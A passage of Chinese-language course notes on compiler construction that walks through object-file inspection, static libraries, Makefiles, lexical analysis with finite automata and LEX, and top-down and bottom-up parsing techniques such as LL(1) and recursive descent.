factor.c # 或者可以由我们已经得到的汇编代码使用以下的命令汇编成机器码： # $ as factor.s -o factor.o $ ls | grep \\\\.o factor.o # gcc -c 指令，当 -o 选项缺省时，默认输出文件为 factor.o 分析 obj 文件 #  使用该 objdump 指令可以看到 .o 文件的反汇编代码。\n$ objdump -d factor.o factor.o: file format pe-x86-64 Disassembly of section .text: 0000000000000000 \u0026lt;main\u0026gt;: 0: 55 push %rbp 1: 48 89 e5 mov %rsp,%rbp 4: 48 83 ec 30 sub $0x30,%rsp 8: e8 00 00 00 00 callq d \u0026lt;main+0xd\u0026gt; d: 48 8d 45 f4 lea -0xc(%rbp),%rax 11: 48 89 c2 mov %rax,%rdx 14: 48 8d 0d 00 00 00 00 lea 0x0(%rip),%rcx # 1b \u0026lt;main+0x1b\u0026gt; 1b: e8 00 00 00 00 callq 20 \u0026lt;main+0x20\u0026gt; 20: c7 45 fc 02 00 00 00 movl $0x2,-0x4(%rbp) 27: c7 45 f8 01 00 00 00 movl $0x1,-0x8(%rbp) 2e: eb 0e jmp 3e \u0026lt;main+0x3e\u0026gt; 30: 8b 45 f8 mov -0x8(%rbp),%eax 33: 0f af 45 fc imul -0x4(%rbp),%eax 37: 89 45 f8 mov %eax,-0x8(%rbp) 3a: 83 45 fc 01 addl $0x1,-0x4(%rbp) 3e: 8b 45 f4 mov -0xc(%rbp),%eax 41: 39 45 fc cmp %eax,-0x4(%rbp) 44: 7e ea jle 30 \u0026lt;main+0x30\u0026gt; 46: 8b 45 f4 mov -0xc(%rbp),%eax 49: 89 c2 mov %eax,%edx 4b: 48 8d 0d 00 00 00 00 lea 0x0(%rip),%rcx # 52 \u0026lt;main+0x52\u0026gt; 52: e8 00 00 00 00 callq 57 \u0026lt;main+0x57\u0026gt; 57: 48 83 c4 30 add $0x30,%rsp 5b: 5d pop %rbp 5c: c3 retq 5d: 90 nop 5e: 90 nop 5f: 90 nop 使用 nm 指令可以查看 obj 文件中的符号表：\n$ nm factor.o 0000000000000000 b .bss 0000000000000000 d .data 0000000000000000 p .pdata 0000000000000000 r .rdata 0000000000000000 r .rdata$zzz 0000000000000000 t .text 0000000000000000 r .xdata U __main 0000000000000000 T main U printf U scanf # 第二列中出现了一些符号，其中： # `T` 表示该符号已经被定义了，`U` 表示该符号还需要被链接器定义 链接器的工作 #  链接器会链接目标代码和库生成一个可执行文件 factor.exe。其中 ld 是 GNU 的链接器。\nGNU ar #  GUN ar program manual page.\nWhat does ar do?\n 创建，修改和提取存档（archives）  What is archives?\n 存档是一个单独的文件，其中包含一个结构中的其他文件集合，可以检索原始的单个文件（这些单个文件被称为存档的成员，member of archives）  以下为一个是用 ar 创建静态链接库的实例：\n$ gcc -c header.cpp -o header $ ar rvs header.lib header.o $ gcc main.cpp header.lib GNU Makefile #  Makefile 是一个包含一系列格式化命令的文件，使用 make 命令，GUN 会自动找到 Makefile 这个文件，并且执行里面描述的命令参数。\nMakefile 主要由以下的三个部分组成：\n \u0026ldquo;target\u0026rdquo;：通常是指可执行文件或对象文件的文件名。 \u0026ldquo;prerequisites\u0026rdquo;：一个文件列表，其中列举出了创建 \u0026ldquo;target\u0026rdquo; 文件需要的依赖文件。 \u0026ldquo;command\u0026rdquo;：创建文件时，执行的一系列编译或链接命令。  基于这三个简单规则的 Makefile 文件可以写成如下的形式：（其中，clean 可以用来清除损坏的文件等，可以在终端中输入命令 make clean 进行调用）\ntextr : main.o blurb.o database.o g++ -o textr main.o blurb.o database.o main.o : main.cpp g++ -c main.cpp blurb.o : blurb.cpp blurb.h g++ -c blurb.cpp database.o : database.cpp database.h g++ -c database.cpp clean: rm -f core textr main.o blurb.o database.o 我们可以在 Makefile 中集成定义自己的变量，并且省略一些默认的参数：\n#Makefile for “textr” C++ application PROG = textr CC = g++ CPPFLAGS = -g –Wall –I/usr/class/cs193d/include LDFLAGS = -L/usr/class/cs193/lib –lCoolFns OBJS = main.o blurb.o database.o $(PROG) : $(OBJS) $(CC) $(LDFLAGS) -o $(PROG) $(OBJS) main.o : $(CC) $(CPPFLAGS) -c main.cpp blurb.o : blurb.h $(CC) $(CPPFLAGS) -c blurb.cpp database.o : database.h $(CC) $(CPPFLAGS) -c database.cpp clean: rm -f core $(PROG) $(OBJS) "},{"id":197,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/1.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/","title":"1.词法分析","section":"编译原理","content":" 学习地址：\n 国防科技大学编译原理 MOOC 课程   词法分析 #  词法分析器 #  任务 #  词法分析的任务：\n 从左到右逐个字符地对源程序进行扫描，产生一个单词符号序列\n 执行词法分析任务的叫做词法分析器（Lexical Analyzer）\n功能 #  词法分析器的功能：\n 输入源程序、输出单词符号\n 单词符号种类：\n  基本字，或关键字：\n  标识符：用来表示各种用户定义的名字\n  常数\n  运算符：+、-、*、/\n  分界符：,、;\u0026hellip;\n  词法分析器的输出：\n 输出的单词符号的表示形式 → 单词种别、单词自身的值  与语法分析 #  体现了 分解 和 权衡 两种计算思维。\n结构 #    预处理子程序：剔除无用的空白、跳格等编辑性字符。放入扫描缓冲区。\n  扫描器通过 起点指示器 和 搜索指示器 两个指针对扫描缓冲区进行扫描。\n NOTE：解决标识符过长问题 → 将缓冲区分为两个半区，互补使用。半区的缓冲区长度就是程序允许的标识符的最大长度。    单词符号的识别 #    超前搜索\n现代语言一般加入几点限制，来避免超前搜索：\n  所有基本字都是保留字，用户不能用它们作为自己的标识符。\n  基本字作为特殊的标识符来处理，使用保留字表。\n  如果基本字、标识符和常数（或标号）之间没有确定的运算符或界符作为间隔，则必须使用一个空白作为间隔。\n    状态转换图。用于识别（或接受）一定的字符串：若存在一条从初态到某一终态的道路，且这条道路上的所有弧上的表机腹连接成的字等于 $$\\alpha$$，则称 $$\\alpha$$ 被该状态转换图所识别（接受）。\n将状态转换图一般化：\n  变量 curState 用于保存现有状态\n  用二维数组表示状态图：stateTrans[state][ch]\n    设计 #   设计程序设计语言的单词规范 设计程序语言对应的状态转换图 根据状态转换图，并根据三种分析模式，编程实现代码  该过程十分有规律，那么是否有自动生成词法分析器的方法呢    自动生成词法分析器 #  基础理论：正规表达式和有限自动机理论。\n概念 #  基本概念：\n  字母表：一个有穷字符集，记作 $$\\Sigma$$\n  字符串：$$\\Sigma$$ 中的字符构成的有穷序列，或称 字\n  空字：不包含任何字符的序列，记作 $$\\epsilon$$\n  $$\\Sigma^{*}$$ 表示 $$\\Sigma$$ 上所有字的集合，包含空字 $$\\epsilon$$\n  子集的连接（积）：$$UV = {\\alpha\\beta | \\alpha \\in U \u0026amp; \\beta \\in V}\\ where\\ U,V \\subseteq \\Sigma^{*}$$\n  V 的闭包：$${\\displaystyle V^{*} = \\cup^{+\\infin}_{i=0} V_i }$$\n  V 的正规闭包：$$V^{+} = VV^{*}$$\n  正规式和正规集：\n  关系：\n 正规集可以用正规集表示 正规式是表示正规集的一种方法 一个字集合是正规式 $$\\Leftrightarrow$$ 他能用正规式表示    递归定义：\n $$\\epsilon$$ 和 $$\\varnothing$$ 都是 $$\\Sigma$$ 上的正规式，他们所表示的正规集是 $${\\epsilon}$$ 和 $$\\varnothing$$。 任何 $$a \\in \\Sigma$$，$$a$$ 是 $$\\Sigma$$ 上的正规式，他表示的正规集为 $${a}$$ 假定 $$e_1$$ 和 $$e_2$$ 都是 $$\\Sigma$$ 上的正规式，他们所表示的正规集为 $$L(e_1)$$ 和 $$L(e_2)$$，则：  $$(e_1 | e_2)$$ 为正规式，他们所表示的正规集为 $$L(e_1) \\cup L(e_2)$$ $$(e_1 \\cdot e_2)$$ 为正规式，他们所表示的正规集为 $$L(e_1)L(e_2)$$ $$(e_1)^{}$$ 为正规式，他所表示的正规集为 $$(L(e_1))^{}$$   Define：仅有有限次使用上述三步骤而定义的表达式才是 $$\\Sigma$$ 上的正规式，仅由这些正规式表示的字集才是 $$\\Sigma$$ 上的正规集。    等价：若两个正规式所表示的正规集相同，则这两个正规式等价。\n  确定有限自动机 DFA #  对状态转换图进行形式化定义，就得到了确定有限自动机的概念：\n  确定有限自动机 $$M$$ 可以表示为一个五元组，$$M = (S, \\Sigma, f, S_0, F)$$ ，其中：\n $$S$$ ：有穷状态集； $$\\Sigma$$：输入字母表（有穷）； $$f$$ ：状态转换函数，为 $$S \\times \\Sigma \\rightarrow S$$ 的单值部分映射； $$S_0$$：是唯一的一个初态，$$S_0 \\in S$$ $$F$$：终态集（可空）    如果对于 $$\\Sigma^{*}$$ 中的任何字 $$\\alpha$$，若存在一条从初态到某一终态的道路，且这条路上所有弧上的标记符连接成的字等与 $$\\alpha$$，则称 $$\\alpha$$ 为 DFA M 所识别（接受）。DFA M 所识别的字的全体记位 $$L(M)$$\n  非确定有限自动机 NFA #  NFA 与 DFA 有着相似的定义，不同点在于上面的第 3、4 点。转换函数的终态不确定，体现了非确定的含义。\n  确定非有限自动机 $$M$$ 可以表示为一个五元组，$$M = (S, \\Sigma, f, S_0, F)$$ ，其中：\n $$S$$ ：有穷状态集； $$\\Sigma$$：输入字母表（有穷）； $$f$$ ：状态转换函数，为 $$S \\times \\Sigma^{*} \\rightarrow 2^{S}$$ 的单值部分映射； $$S_0$$：是一个非空初态集，$$S_0 \\subseteq S$$ $$F$$：终态集（可空）    对于 $$\\Sigma^{*}$$ 中的任何字 $$\\alpha$$，若存在一条从初态到某一终态的道路，且这条道路上所有弧上的标记字连接成的字等于 $$\\alpha$$（忽略那些标记为 $$\\epsilon$$ 的弧），则称 $$\\alpha$$ 为 NFA M 所接受。NFA M 所识别的字的全体记为 $$L(M)$$\n  NFA vs. DFA #  区别 #  从状态图看他们的区别：\n  NFA 可以有多个初态。\n  弧上的标记可以是 $$\\Sigma^{*}$$ 中的一个字（甚至可以是一个正规式），而不一定是单个字符。\n  同一个字可能出现在同状态射出的多条弧上。\n  DFA 是 NFA 的特例。\n  等价 #   对于任何两个有限自动机 M 和 M'，如果 $$L(M) = L(M')$$，则称 M 与 M' 等价。\n 自动机理论中的结论：\n 自动机理论中的一个重要结论：判断两个自动机等价性的算法是存在的。 DFA 与 NFA 识别能力是相同的  根据定义我们知道，DFA 是特殊的 NFA，所以我们只需要一个将 NFA 确定化的算法。\nNFA 确定化：假定 NFA $$M = (S, \\Sigma, f, S_0, F)$$，我们对 M 的状态转换图进行如下改造：\n  等价变换 1：引进新的初始结点 X 和终态结点 Y，$$X, Y \\notin S$$，从 X 到 $$S_0$$ 中任意状态结点连一条 $$\\epsilon$$ 箭弧，从 F 中任意状态结点引一条 $$\\epsilon$$ 箭弧到 Y → 解决初始状态唯一性问题。\n  等价变换 2：对 M 的状态转换图进一步施加替换，其中 k 是新引入的状态 → 简化了图上的标记。\n  等价变换 3：算法，子集法 → 解决 $$\\epsilon$$ 弧和转换关系：\n  概念 $$\\epsilon$$-闭包（$$\\epsilon-closure(I)$$）：设 I 是 S 的一个子集，定义 I 的 $$\\epsilon$$-闭包为：\n 若 $$s \\in I$$，则 $$s \\in \\epsilon-closure(I)$$； 若 $$s \\in I$$，从 s 出发经过任意条 $$\\epsilon$$ 弧能够达到的任何状态 $$s'$$ 都属于 $$\\epsilon-closure(I)$$    定义 $$I_a = \\epsilon-closure(J)\\ where\\ a \\in \\Sigma, J 为 I中的状态经过一条 a 弧到达的状态集合$$\n  算法，子集法：不失一般性，设字母表只包含两个 a 和 b，我们构造一张计算状态集的转换表：\n  首先，置第 1 列为 $$\\epsilon-closure({X})$$，并求出这一列的 $$I_a$$ 和 $$I_b$$\n  然后检查这两个 $$I_a$$ 和 $$I_b$$，看他们是否在表的第一列中出现，把未曾出现的填入后面的空行的第 1 列上，求出每行第 2，3 列上的集合。\n  重复上述过程，直到所有第 2，3 的子集均出现在第一列为止。\n  该转换表唯一刻画了一个 DFA M，其中初态是 $$\\epsilon-closure(X)$$，终态是含有原终态 Y 的子集。\n      DFA 的化简 #  概念：\n DFA 的化简（最小化）：对于给定的 DFA M，寻找一个状态数比 M 少的 DFA M'，使得 $$L(M) = L(M')$$。 状态的等价性：假设 s 和 t 为 M 的两个状态，如果从状态 s 出发能读出某个字 $$\\alpha$$ 而停止于终态，那么同样，从 t 出发也能读出 $$\\alpha$$ 而停止于终态，反之亦然，则称状态 s 和 t 等价。 状态可区别：如果两个状态不等价，则称他们是可区别的。  DFA 化简：\n  基本思想：把 M 的状态集划分成一些不相交的子集，使得任何两个不同子集的状态是可区别的，而同一子集内的任何两个状态是等价的。最后，让每个子集选出一个代表，同时消去其他状态。\n  化简算法：\n  首先把 S 划分为终态和非终态两个子集，形成基本划分 $$\\Pi$$\n  假定到某一时刻，$$\\Pi$$ 含有 m 个子集，记作：$$\\Pi = {I^{(1)}, I^{(2)}, \u0026hellip;, I^{(m)}}$$，检查 $$\\Pi$$ 中的每个子集是否可以进一步划分：\n  对某个 $$I^{i}$$，若存在一个输入字符 a 使得 $$I_a^{(i)}$$ 不会包含在现行的 $$\\Pi$$ 的某个子集 $$I^{(j)}$$ 中，则应该至少把 $$I^{(i)}$$ 分为两个部分。\n若 $$s_1, s_2 \\in I^{(i)}, a \\in \\Sigma$$，且 $$f(s_1, a) = t_1, f(s_2, a)=t_2$$ ，$$t_1, t_2$$ 属于不同子集，则将 $$I^{(i)}$$ 分成两个部分：\n $$I^{(i1)} = {s | s \\in I^{(i)} 且 s 经 a 弧到达 t，且 t 与 t_1 属于现行 \\Pi 中的同一子集}$$ $$I^{(i2)} = I^{i} - I^{(i1)}$$    一般地，对某个 a 和 $$I^{(i)}$$，若 $$I^{(i)}$$ 落入现行 $$\\Pi$$ 中的 N 个不同子集，则应该把 $$I^{i}$$ 划分成 N 个不相交的组，使得每个组 $$J$$ 的 $$J_a$$ 都落入 $$\\Pi$$ 的同一子集。\n    重复步骤 2，直到 $$\\Pi$$ 所含的子集数目不再增长。\n  对于上述最后划分 $$\\Pi$$ 中的每个子集，我们选取每个子集中的一个状态代表其他状态，则可以得到化简之后的 NFA M‘。\n    正规式和有限自动机的等价性 #  一个正规式 r 与一个有限自动机 M 等价 $$\\Leftrightarrow$$ $$L(r) = L(M)$$\n定理：对于 $$\\Sigma$$ 上任一 NFA M，都存在一个 $$\\Sigma$$ 上的正规式 r，使得 $$L(r) = L(M)$$。证明算法如下：\n  假定 NFA $$M = \u0026lt;S, \\Sigma, \\delta, S_0, F\u0026gt;$$，我们对 M 的状态图进行如下改造：\n  在 M 的状态图上加入两个状态 X 和 Y， 从 X 用 $$\\epsilon$$ 弧连接到 M 的所有初态结点，从 M 的所有终态结点用 $$\\epsilon$$ 弧连接到 Y，从而形成一个新的 NFA，记作 M'，他只有一个初态 X 和一个终态 Y，显然 $$L(M) = L(M')$$\n  将 $${\\displaystyle (i) \\xrightarrow{r_1} (j) \\xrightarrow{r_2} (k)}$$ 替换为 $${\\displaystyle (i) \\xrightarrow{r_1 \\cdot r_2} (k)}$$\n  将替换为 $$(i) \\xrightarrow{r_1 | r_2} (j)$$\n  将 替换为 $$(i) \\xrightarrow{r_1 \\cdot r_2* \\cdot r_3} (k)$$\n  重复上述 2-4 规则，直至图中只剩下两个结点一条弧。最后 X 到 Y 上的弧标记的正规式即为自动机所对应的正规式 r。\n    定理：对于任何一个正规式 r，都存在一个 NFA M，使得 $$L(M) = L(r)$$，并且 M 只有一个初态和一个终态，而且没有从终态出发的箭弧。对运算符数目 k 进行数学归纳法证明，证明如下：\n  若 r 具有 0 个运算符，则 $$r = \\epsilon$$ 或 $$r = \\varnothing$$ 或 $$r = a\\ where\\ a \\in \\Sigma$$。很显然容易构造这样满足要求的 NFA。\n  假设对于运算符数目少于 $$k(k \\ge 1)$$ 的正规式成立，当 r 中含有 k 个运算符时，r 有三种情况，显然都成立。\n  PostScript：上述证明实际上也是将正规表达式构造成 NFA 的算法。\n  词法分析自动生成 LEX #  编译流程大致如下：\n简单使用 #  LEX 官方手册如下：http://dinosaur.compilertools.net/lex/index.html。以下介绍简单规范：\n  LEX 编写主要分为 AUXILIARY DEFINITION （辅助定义）和 RECOGNITION RULES （识别规则）两个部分\n  辅助定义：以文法形式给常用正规式进行命名，比如：digit-\u0026gt;1|2|3|4|5|6|7|8|9|0\n  识别规则：都由两部分组成，一个正规式和一小段程序代码。\n    工作流程 #  LEX 工作过程：\n 对于每一个识别规则 $$P_i$$ 构造一个响应的非确定有限自动机 $$M_i$$； 通过一个 $$\\epsilon$$ 弧将这些自动机连接成一个新的 NFA； 把 NFA 确定化、最小化，生成该 DFA 的状态转换表和控制执行程序。  "},{"id":198,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/review/","title":"Review","section":"2.语法分析","content":" 编译原理期末考试复习，于 2019-1-15\n REVIEW #  graph TB;\rTOPIC[语法分析];\rTOPIC--\u0026gt;M1; TOPIC--\u0026gt;M2;\rsubgraph 自上而下\rM1[自上而下]; WF1(\u0026quot;LL(1)文法\u0026quot;); WF11(递归下降分析器); WF12(预测分析程序);\rM1--\u0026gt;|1.不含左递归\u0026lt;br\u0026gt;2.非终结符 FIRST 集不相交\u0026lt;br\u0026gt;3.一个关于epsilon时的约束|WF1\rWF1--\u0026gt;|一个非终结符\u0026lt;br\u0026gt;对应一个子程序|WF11;\rWF1--\u0026gt;|构造预测分析表|WF12\rend\rsubgraph 自下而上\rM2[自下而上]; WF2(算符优先文法); WF3(\u0026quot;LR分析法\u0026quot;); WF31(\u0026quot;SLR分析法\u0026lt;br\u0026gt;LR(0)项目\u0026quot;); WF32(\u0026quot;规范LR分析法\u0026lt;br\u0026gt;LR(1)项目\u0026quot;); WF33(\u0026quot;LALR分析法\u0026quot;)\rM2--\u0026gt;|\u0026quot;1.算符文法:\u0026lt;br\u0026gt;不含两个相继的非终结符\u0026lt;br\u0026gt;2.算符优先文法:\u0026lt;br\u0026gt;算符间关系是唯一的\u0026quot;|WF2\rM2--\u0026gt;|状态\u0026lt;br\u0026gt;ACTION 子表\u0026lt;br\u0026gt;GOTO 子表|WF3\rWF3--\u0026gt;|1.无移进规约冲突\u0026lt;br\u0026gt;2.不含多个规约项|WF31\rWF3--\u0026gt;|\u0026quot;通过多读一个词\u0026lt;br\u0026gt;解决LR(0)冲突\u0026quot;|WF32\rWF3--\u0026gt;|\u0026quot;合并LR(1)项目同心集\u0026quot;|WF33\rend\r"},{"id":199,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B/","title":"自上而下","section":"2.语法分析","content":"自上而下分析 Top-down #  从文法的开始符号开始，反复使用各种产生式，寻找 “匹配” 的推导。\n 推导：根据文法的产生式规则，把串中出现的产生式的左部符号替换成右部  从树的根节点开始，构造语法树。\n算法：递归下降法，预测分析程序。\n基本问题 #  面临的两个基本问题\n 当面临多个候选式时的回溯问题。 文法的左递归问题。  左递归的消除 #  一个文法消除左递归的条件：\n 不含以 $$\\epsilon$$ 为右部的左产生式 不含回路，即不含推导 $$P \\Rightarrow P$$  直接左递归的消除：\n 产生式的直接左递归：$$P \\rightarrow P\\alpha | \\beta, \\beta 不以 \\beta 开头$$ 转变成右递归文法：  $$P \\rightarrow \\beta P'$$ $$P' \\rightarrow \\alpha P' | \\epsilon$$   推广：$$P \\rightarrow P\\alpha_1 | P\\alpha_2 | \u0026hellip;| P\\alpha_m| \\beta_1 | \\beta_2 | \u0026hellip; | \\beta_n$$（每个 $$\\alpha$$ 都不等于 $$\\epsilon$$，每个 $$\\beta$$ 都不以 P 开头）  $$P \\rightarrow \\beta_1 P' | \\beta_2 P‘ |\u0026hellip;|\\beta_n P'$$ $$P' \\rightarrow P' \\alpha_1 | P' \\alpha_2 | \u0026hellip; | P' \\alpha_m$$    间接左递归的消除：\n 算法：  把文法 G 中的所有非终结符按任意一种顺序排列 $$P_1, P_2, \u0026hellip;, P_n$$；按此顺序执行： 把 $$P_i$$ 的规则改造 成 $$P_i \\rightarrow a\u0026hellip;|P_{i+1}\u0026hellip;|P_{i+2}\u0026hellip;|\u0026hellip;|P_{i+k}\u0026hellip;$$，即 $$P_i$$ 的推导式，只能以下标大于 $$i$$ 的开头。并消除 $$P_i$$ 的直接左递归。 化简 2 所得到的文法，去除从开始符号出发无法到达的非终结符的产生规则。    回溯的消除 #  回溯消除的结果：\n 对于文法的任何非终结符，当他要去匹配输入串时，能够根据它所面临的输入符号准确地指派它的一个候选去执行任务，并且此候选的工作结果应该是确信无疑的。  引入概念：\n FIRST 集合：  令 G 是一个不含左递归的文法，对于 G 中的每个非终结符 $$\\alpha$$ 定义它的终结首符号集 $$FIRST(\\alpha)$$ 为：  $$FISRT(\\alpha) = {a | \\alpha \\Rightarrow a\u0026hellip;, a \\in V_T}$$ 特别的，若 $$\\alpha \\Rightarrow \\epsilon$$，则规定 $$\\epsilon \\in FIRST(\\alpha)$$   则：没有回溯 $$\\Leftrightarrow$$ $$ A \\rightarrow \\alpha_i|\\alpha_j, FIRST(\\alpha_i) \\cap FIRST(\\alpha_j) = \\varnothing $$   FOLLOW 集合：  假定 S 是文法的开始符号，对于 G 的任何非终结符 A，我们定义 A 的 FOLLOW 集合：  $$FOLLOW(A) = {a | S \\Rightarrow \u0026hellip;Aa\u0026hellip;., a \\in V_T}$$ 特别的，若 $$S \\Rightarrow \u0026hellip;A$$，则规定 $$ $ \\in FOLLOW(A) $$      算法：\n 提取左公共因子：  假定 A 的规则是：$$A \\rightarrow \\delta \\beta_1 | \\delta \\beta_2 | \u0026hellip; | \\delta \\beta_n | \\gamma_1 | \\gamma_2 | \u0026hellip; | \\gamma_m$$（其中每个 $$\\gamma$$ 都不以 $$\\delta$$ 开头） 那么可以将这些规则改写成：  $$A \\rightarrow \\delta A' | \\gamma_1 | \\gamma_2 | \u0026hellip; | \\gamma_m $$ $$A' \\rightarrow \\beta_1 | \\beta_2 | \u0026hellip; | \\beta_n$$      LL(1) 文法 #  一个文法 G 满足下面条件，称作该文法 G 为 LL(1) 文法。\n 文法不含左递归 对于文法中每一个非终结符 A 的各个产生式的候选首符集两两不相交。  即：$$ A \\rightarrow \\alpha_i|\\alpha_j, FIRST(\\alpha_i) \\cap FIRST(\\alpha_j) = \\varnothing $$   对文法中的每一个非终结符，若存在某个候选首符集包含 $$\\epsilon$$，则：$$FIRST(\\alpha_i) \\cup FOLLOW(A) = \\varnothing, i=1,2,\u0026hellip;,n$$  其中第一个 L 表示从左到右扫描输入串，第二个 L 表示分析过程是一个最左推导，1 表示每次只需前进一个符号。\nLL(1) 分析法 #  对于LL(1) 文法，可以对其输入串进行有效的无回溯自上而下分析：\n 假设要用非终结符 A 进行匹配，面临的输入符号为 a，A 的所有产生式为：$$A \\rightarrow \\alpha_1 | \\alpha_2 | \u0026hellip; | \\alpha_n$$  若 $$a \\in FIRST(\\alpha_i)$$，则指派 $$\\alpha_i$$ 执行匹配任务； 若 $$\\forall i, a \\notin FIRST(\\alpha_i). \\exist i, \\epsilon \\in FIRST(\\alpha_i) 且 a \\in FOLLOW(\\alpha_i)$$，则让 A 与 $$\\epsilon$$ 自动匹配。 否则，a 的出现是一种语法错误。    FIRST 和 FOLLOW 集 #  $$FISRT(\\alpha) = {a | \\alpha \\Rightarrow a\u0026hellip;, a \\in V_T}$$\n构造 $$FIRST(\\alpha)$$：\n 对于 $$\\alpha = X, X \\in V_T \\cup V_N$$  对于每一个 $$X \\in V_T \\cup V_N$$，连续使用下面规则，直至 FIRST 集合不再增大为止：  若 $$X \\in V_T$$，则 $$FIRST(X) = {X}$$ 若 $$X \\in V_N, \\exist X \\rightarrow a\u0026hellip;, a \\in V_T$$，则 $$FIRST(X) += {a}$$ 若 $$ \\exist X \\rightarrow Y_1Y_2..Yi\u0026hellip;Y_k $$，其中 $$Y_1, Y_2,\u0026hellip;, Y_{i-1}$$ 都是非终结符  若 $$\\forall j, 1 \\le j \\le i-1, \\epsilon \\in FIRST(Y_j)$$，则 $$FIRST(X) += FIRST(Y_i) - {\\epsilon}$$ 若 $$\\forall j, 1 \\le j \\le k, \\epsilon \\in FIRST(Y_j)$$，则 $$FIRST(X) += {\\epsilon}$$     NOTICE：任何一个符号的 FIRST 集合发生了变化，都要重新开始扫描。直到一次扫描过程中，FIRST 集合没有任何发生变化。   对于 $$\\alpha = X_1 X_2 \u0026hellip; X_n$$  置 $$FIRST(\\alpha) = FIRST(X_1) - {\\epsilon}$$ 若 $$\\forall j, 1 \\le j \\le i-1, \\epsilon \\in FIRST(X_j)$$，则 $$FIRST(X) += FIRST(X_i) - {\\epsilon}$$ 若 $$\\forall j, 1 \\le j \\le k, \\epsilon \\in FIRST(X_j)$$，则 $$FIRST(X) += {\\epsilon}$$    $$FOLLOW(A) = {a | S \\Rightarrow \u0026hellip;Aa\u0026hellip;., a \\in V_T}$$\n构造 $$FOLLOW(\\alpha)$$ ：\n 连续使用下面的规则，直到 FOLLOW 不再增大为止：  对于文法的开始符号，置 $$ $ $$ 于 FOLLOW(S) 中； 若 $$\\exist A \\rightarrow \\alpha B \\beta, FOLLOW(B) += FIRST(\\beta)-{\\epsilon}$$ 若 $$(\\exist A \\rightarrow \\alpha B) \\or (\\exist A \\rightarrow \\alpha B \\beta \\and \\epsilon \\in FIRST(\\beta))$$，则 $$FOLLOW(B) += FOLLOW(A)$$    递归下降分析器 #  分析程序由一组子程序组成，对每一个语法单位构造一个相应的子程序，识别对应的语法单位。通过子程序间的相互调用实现对输入串的识别。\n定义全局过程和变量：\n ADVANCE：把输入串指示器 IP，指向下一个输入符号，即读入一个单词符号 ERROR：出错处理子程序 SYM：IP 当前所指向的输入符号  子程序设计：每个非终结符都有对应的子程序定义，在分析的过程中，当需要从某个非终结符出发进行展开（推导）时，就调用这个非终结符对应的子程序。\n以 $$A \\rightarrow TE | BC | \\epsilon $$ 为例，其递归下降子程序为：\nPROCEDURE A;\rBEGIN\rif SYM in FIRST(TE) then\rBEGIN T; E; END\relse if SYM in FIRST(BC) then\rBEGIN B; C; END\relse if SYM not in FOLLOW(A) then\rERROR\rEND;\rPostScript: 扩充巴科斯范式。\n在元符号 $$\\rightarrow$$ 或 ::= 和 | 的基础上，扩充以下几个元语言符号：\n 用 $${\\alpha}$$ 表示闭包运算 $$a^*$$； 用 $${\\alpha}_0^n$$ 表示可任意重复 0 次到 n 次； $$[\\alpha] \\Leftrightarrow {\\alpha}_0^1 \\Leftrightarrow \\alpha | \\epsilon$$  JavaCC 工作流程入下：\n预测分析程序 #  分析流程 #  预测分析程序的构成：\n 总控程序：根据现行栈顶符号和当前输入符号，执行动作 分析表 $$M[A, a]$$ 矩阵：$$A \\in V_N, a \\in V_T \\cap {end}$$ 分析栈 STACK：用于存放文法符号  预测分析过程：总控程序根据当前栈顶符号 X 和输入符号 a，执行下列三个动作之一：\n 若 $$X = a = end ​$$，则宣布分析成功，停止分析； 若 $$X = a \\neq end $$，则把 X 从 STACK 栈顶取出，让 a 指向下一个输入符号； 若 $$X \\neq a $$ 且 X 是一个非终结符，则查看分析表 M：  若 $$M[X, a]$$ 中存放着关于 X 的一个产生式，把 X 出栈，把产生式的右部符号串按反序推进 STACK 栈中； 若 $$M[X, a]$$ 中未存放任何标记或 “出错标志” 的话，则调用出发诊察程序 ERROR。   若 $$X \\neq a$$ 且 X 是一个终结符，则调用错误诊察程序 ERROR。  分析表的构造 #  首先需要计算每个非终结符 X 的 $$FIRST(X)$$ 和 $$FOLLOW(X)$$ 集合。\n构造 G 的分析表 $$M[A, a]$$，即确定每个产生式 $$A \\rightarrow \\alpha$$ 在表中的位置：\n 对文法 G 的每个产生式执行第 2 步和第 3 步： $$\\forall a \\in FIRST(\\alpha), M[A,a] = \u0026ldquo;A \\rightarrow \\alpha\u0026rdquo;$$ 若 $$\\epsilon \\in FIRST(\\alpha)$$，则 $$\\forall b \\in FOLLOW(A), M[A,b] = A \\rightarrow \\alpha$$  可以证明：一个文法 G 的预测分析表 M 不含多重定义入口 $$\\Leftrightarrow$$ 该文法为 LL(1) 的 $$\\Leftrightarrow$$ 该文法无二义性。\nPostScript：尽管构造的文法可能是二义的，但是可以通过手动消除的方式取消二义性，比如：if stat else if stat else stat\n"},{"id":200,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/%E8%87%AA%E4%B8%8B%E8%80%8C%E4%B8%8A/","title":"自下而上","section":"2.语法分析","content":"自下而上 Bottom-up #  从输入串开始，逐步进行归约，直到文法的开始符号。\n 规约：根据文法的产生式规则，把串中出现的产生式右部替换成左部符号；  从树的叶节点开始，构造语法树。\n算法：算符优先分析法，LR 分析法。\n简述概念 #  基本思想：\n 采用 “移进-规约” 思想进行自下而上分析 用一个寄存符号的先进后出栈，把输入符号一个一个地移进栈里，当栈顶形成某个产生式的候选式时，即把栈顶的这一部分替换为（规约）该产生式的左部  核心问题：识别可归约串。\n短语：\n 令 G 是一个文法，S 是文法的开始符号，假设 $$\\alpha \\beta \\delta$$ 是文法 G 的一个句型，如果有 $$S \\overset{*}{\\Rightarrow} \\alpha A \\delta 且 A \\overset{+}{\\Rightarrow} \\beta$$，则 $$\\beta$$ 称是句型 $$\\alpha \\beta \\delta$$ 相对于非终结符 A 的短语。 如果有 $$A \\Rightarrow \\beta$$，则称 $$\\beta$$ 是句型 $$\\alpha \\beta \\delta$$ 相对于规则 $$A 